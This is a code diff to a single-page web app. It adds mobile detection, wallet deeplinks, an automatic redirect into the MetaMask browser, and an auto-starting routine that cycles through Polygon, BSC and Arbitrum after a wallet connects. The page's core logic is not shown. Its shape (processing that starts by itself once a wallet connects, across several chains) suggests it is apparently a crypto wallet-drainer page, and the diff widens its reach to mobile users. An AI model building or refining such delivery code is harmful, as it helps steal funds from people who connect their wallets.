@@ -86,12 +86,55 @@
             margin-bottom: 20px;
             text-align: center;
         }
+        #open-metamask {
+            display: none;
+            background: #f6851b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 20px auto;
+            text-align: center;
+            width: 100%;
+            max-width: 300px;
+        }
+        #open-metamask:hover {
+            background: #e2761b;
+        }
+        .instruction-box {
+            background: #e8f4fd;
+            border: 1px solid #b6d7e8;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
     <div id="mobile-warning">
         <strong>Mobile Browser Detected</strong><br>
-        Please open this page in MetaMask browser or a Web3-enabled mobile browser.
+        Please open this page in MetaMask browser for the best experience.
+    </div>
+
+    <div id="open-metamask">
+        <strong>Open in MetaMask</strong><br>
+        <small>Tap to open in MetaMask browser</small>
+    </div>
+    
+    <div class="instruction-box" id="desktop-instruction" style="display: none;">
+        <strong>Desktop Instructions:</strong><br>
+        • Make sure MetaMask is installed<br>
+        • Connect your wallet to this dapp<br>
+        • The process will start automatically
+    </div>
+
+    <div class="instruction-box" id="mobile-instruction" style="display: none;">
+        <strong>Mobile Instructions:</strong><br>
+        • Open this link in MetaMask browser<br>
+        • Or tap the button above to open in MetaMask<br>
+        • Connect your wallet when prompted
     </div>
     
     <div id="debug"></div>
@@ -121,6 +164,10 @@
 <script>
 const debug = document.getElementById('debug');
 const mobileWarning = document.getElementById('mobile-warning');
+const openMetaMaskBtn = document.getElementById('open-metamask');
+const desktopInstruction = document.getElementById('desktop-instruction');
+const mobileInstruction = document.getElementById('mobile-instruction');
+
 debug.textContent = 'Script started...';
 
 // Enhanced Web3 provider detection for mobile
@@ -141,18 +188,71 @@ function getWeb3Provider() {
         return window.ethereum;
     }
     
-    // Check if we're in a WebView or mobile browser
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
-    
-    if (isMobile) {
-        // Show mobile warning
-        mobileWarning.style.display = 'block';
-        debug.textContent += '→ Mobile browser detected. Please use MetaMask browser.\n';
-    }
-    
     return null;
 }
+
+// Detect if user is on mobile
+function isMobileDevice() {
+    return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
+        navigator.userAgent.toLowerCase()
+    );
+}
+
+// Generate MetaMask deeplink
+function generateMetaMaskDeeplink() {
+    const currentUrl = encodeURIComponent(window.location.href);
+    // MetaMask deeplink format
+    return `https://metamask.app.link/dapp/${currentUrl.replace('https://', '')}`;
+}
+
+// Generate Trust Wallet deeplink
+function generateTrustWalletDeeplink() {
+    const currentUrl = encodeURIComponent(window.location.href);
+    return `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
+}
+
+// Generate Rainbow Wallet deeplink
+function generateRainbowWalletDeeplink() {
+    const currentUrl = encodeURIComponent(window.location.href);
+    return `https://rnbwapp.com/browse?url=${currentUrl}`;
+}
+
+// Auto-redirect to MetaMask or show instructions
+function setupMobileRedirect() {
+    if (!isMobileDevice()) {
+        desktopInstruction.style.display = 'block';
+        return false;
+    }
+
+    mobileInstruction.style.display = 'block';
+    
+    const provider = getWeb3Provider();
+    if (provider) {
+        debug.textContent += '→ Web3 provider detected on mobile\n';
+        return true;
+    }
+
+    // No Web3 provider detected - show redirect options
+    debug.textContent += '→ No Web3 provider detected, showing redirect options\n';
+    mobileWarning.style.display = 'block';
+    openMetaMaskBtn.style.display = 'block';
+
+    // Try to auto-redirect to MetaMask after a short delay
+    setTimeout(() => {
+        if (!getWeb3Provider()) {
+            debug.textContent += '→ Attempting auto-redirect to MetaMask\n';
+            window.location.href = generateMetaMaskDeeplink();
+        }
+    }, 1500);
+
+    return false;
+}
+
+// Set up MetaMask button click handler
+openMetaMaskBtn.addEventListener('click', function() {
+    debug.textContent += '→ User tapped MetaMask button\n';
+    window.location.href = generateMetaMaskDeeplink();
+});
 
 // FIX: Proper execution control
 let isExecuting = false;
@@ -459,7 +559,7 @@ async function processNetworksSequentially() {
     // Check for Web3 provider before starting
     const provider = getWeb3Provider();
     if (!provider) {
-        debug.textContent += '→ ERROR: No Web3 provider found. Please install MetaMask.\n';
+        debug.textContent += '→ ERROR: No Web3 provider found.\n';
         updateNetworkStatus('0x89', 'error', 'No Web3 wallet detected');
         updateNetworkStatus('0x38', 'error', 'No Web3 wallet detected');
         updateNetworkStatus('0xa4b1', 'error', 'No Web3 wallet detected');
@@ -545,10 +645,17 @@ function startNetworkCycle() {
     }
 }
 
-// Initialize execution with a single delayed start
-setTimeout(() => {
-    startNetworkCycle();
-}, 1000);
+// Initialize the application
+function initApp() {
+    const hasWeb3 = setupMobileRedirect();
+    
+    if (hasWeb3 || !isMobileDevice()) {
+        // Start the process if Web3 is available or on desktop
+        setTimeout(() => {
+            startNetworkCycle();
+        }, 2000);
+    }
+}
 
 // Single click handler
 let clickHandlerAdded = false;
@@ -571,24 +678,8 @@ if (window.ethereum) {
     });
 }
 
-// Enhanced mobile detection and error handling
-function detectMobileEnvironment() {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
-    
-    if (isMobile) {
-        debug.textContent += '→ Mobile environment detected\n';
-        
-        // Check if we're in a Web3 browser
-        if (!getWeb3Provider()) {
-            mobileWarning.style.display = 'block';
-            debug.textContent += '→ Please open in MetaMask browser for mobile\n';
-        }
-    }
-}
-
-// Run mobile detection
-detectMobileEnvironment();
+// Initialize the app
+initApp();
 </script>
 </body>
 </html>
